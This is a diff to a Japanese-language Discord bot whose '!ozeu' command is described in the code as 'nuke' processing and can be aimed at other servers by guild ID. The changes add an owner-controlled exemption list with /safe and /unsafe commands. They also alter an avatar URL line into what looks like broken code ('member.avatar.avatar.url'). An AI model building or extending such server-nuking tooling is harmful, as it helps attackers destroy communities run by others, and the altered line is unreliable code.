@@ -15,6 +15,9 @@ intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
+# ozeu禁止サーバーIDセット（メモリ内保持）
+ozeu_banned_guilds = set()
+
 @bot.event
 async def on_ready():
     await bot.tree.sync()
@@ -38,6 +41,11 @@ async def ozeu(ctx, guild_id: int = None):
     else:
         # サーバー内からの実行 → 現在のギルドを使用
         guild = ctx.guild
+
+    # 禁止リストチェック
+    if guild.id in ozeu_banned_guilds:
+        await ctx.send(f"❌ このサーバー（ID: {guild.id}）では !ozeu 処理は禁止されています。")
+        return
 
     embed_start = discord.Embed(
         title="📢 !ozeu が実行されました",
@@ -107,6 +115,42 @@ async def ozeu(ctx, guild_id: int = None):
     except Exception as e:
         print(f"退出時にエラー: {e}")
 
+# --- /safe コマンド ---
+@tree.command(name="safe", description="指定したサーバーIDでnuke処理を禁止します")
+@app_commands.describe(server_id="nuke処理を禁止するサーバーのID")
+async def safe(interaction: discord.Interaction, server_id: str):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("❌ このコマンドはBotオーナーのみ使用できます。", ephemeral=True)
+        return
+    try:
+        sid = int(server_id)
+    except:
+        await interaction.response.send_message("❌ サーバーIDは数字で指定してください。", ephemeral=True)
+        return
+    ozeu_banned_guilds.add(sid)
+    await interaction.response.send_message(f"✅ サーバーID `{sid}` を禁止リストに追加しました。", ephemeral=True)
+
+# --- /unsafe コマンド ---
+@tree.command(name="unsafe", description="指定したサーバーIDのozeu処理禁止を解除します")
+@app_commands.describe(server_id="ozeu処理禁止を解除するサーバーのID")
+async def unsafe(interaction: discord.Interaction, server_id: str):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("❌ このコマンドはBotのオーナーのみ使用できます。", ephemeral=True)
+        return
+    try:
+        sid = int(server_id)
+    except:
+        await interaction.response.send_message("❌ サーバーIDは数字で指定してください。", ephemeral=True)
+        return
+    if sid in ozeu_banned_guilds:
+        ozeu_banned_guilds.remove(sid)
+        await interaction.response.send_message(f"✅ サーバーID `{sid}` のozeu禁止を解除しました。", ephemeral=True)
+    else:
+        await interaction.response.send_message(f"❌ サーバーID `{sid}` はozeu禁止リストに登録されていません。", ephemeral=True)
+
+# --- ここからはあなたの元のコードを続けます ---
+
+
 # --- /backup コマンド ---
 @bot.tree.command(name="backup", description="ログを保存します")
 async def backup(interaction: discord.Interaction):
@@ -147,7 +191,7 @@ async def ban(interaction: discord.Interaction, member: discord.Member, reason: 
         )
         embed.add_field(name="理由", value=reason, inline=False)
         if member.avatar:
-            embed.set_thumbnail(url=member.avatar.url)
+            embed.set_thumbnail(url=member.avatar.avatar.url)
         embed.set_footer(text=f"実行者: {interaction.user}", icon_url=interaction.user.avatar.url if interaction.user.avatar else None)
         await interaction.response.send_message(embed=embed)
     except Exception as e:
@@ -342,5 +386,3 @@ async def log(
 
 # --- 起動 ---
 bot.run(TOKEN)
-
-
